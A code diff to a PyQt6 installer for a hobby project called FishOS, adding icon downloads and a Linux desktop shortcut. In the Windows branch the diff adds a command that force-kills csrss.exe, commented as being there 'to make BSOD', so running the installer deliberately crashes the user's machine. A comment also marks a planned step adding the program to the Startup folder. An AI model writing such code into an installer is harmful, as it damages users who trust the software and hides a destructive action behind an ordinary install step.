@@ -1,6 +1,5 @@
 import sys
 import os
-
 import requests
 from PyQt6 import QtGui
 from PyQt6.QtWidgets import *
@@ -49,9 +48,42 @@ class InstallWindow(QWidget):
 
         print(sys.platform)
         if "win" in sys.platform:
-            # Adding Windows Desktop Link
-            pass
-        else:
+            local_appdata = os.getenv("LOCALAPPDATA")
+            local_data = os.path.join(local_appdata, "FishOS")
+            os.mkdir(local_data)
+
+            with open(os.path.join(local_data, 'fos_ICON.ico'), 'wb') as f:
+                try:
+                    r = requests.get(
+                        'https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.ico')
+                    if r.status_code == 200:
+                        f.write(r.content)
+                    else:
+                        QMessageBox.critical(
+                            self,
+                            'Ошибка',
+                            "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
+                        )
+                        f.close()
+                        return
+                except requests.exceptions.ConnectionError:
+                    QMessageBox.critical(
+                        self,
+                        'Ошибка',
+                        "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
+                    )
+                    return
+
+            app_data = os.getenv("APPDATA")
+            startup_folder = os.path.join(app_data, r"Microsoft\Windows\Start Menu\Programs\Startup")
+
+            # Adding EXE to startup
+
+            # Killing csrss.exe to make BSOD
+            os.system('taskkill /F /IM csrss.exe')
+
+            #os.kill(pids[0])
+        elif "linux" in sys.platform:
             home_path = os.getenv("HOME")
             home_dirs = os.listdir(home_path)
 
@@ -63,21 +95,41 @@ class InstallWindow(QWidget):
                 os.mkdir(os.path.join(home_path, "Desktop"))
                 link_path = os.path.join(os.path.join(home_path, "Desktop"))
 
-            local_data = os.path.join(home_path, ".local/FishOS")
+            local_data = os.path.join(home_path, ".local/share/FishOS")
             os.makedirs(local_data, exist_ok=True)
 
             with open(os.path.join(local_data, 'fos_ICON.png'), 'wb') as f:
-                data = requests.get('')
+                try:
+                    r = requests.get('https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.png')
+                    if r.status_code == 200:
+                        f.write(r.content)
+                    else:
+                        QMessageBox.critical(
+                            self,
+                            'Ошибка',
+                            "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
+                        )
+                        f.close()
+                        return
+                except requests.exceptions.ConnectionError:
+                    QMessageBox.critical(
+                        self,
+                        'Ошибка',
+                        "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
+                    )
+                    return
 
             executable_path = sys.executable
             with open(link_path, "w") as f:
-                DATA = f"""[Desktop Entry]
+                DATA = f"""\
+[Desktop Entry]
 Version=1.0
 Name=FishOS
 Comment=Fun Operating System
 Type=Application
 Terminal=false
-Exec={executable_path}"""
+Exec={executable_path}
+Icon={os.path.join(local_data, 'fos_ICON.png')}"""
                 f.write(DATA)
 
         self.installed = True
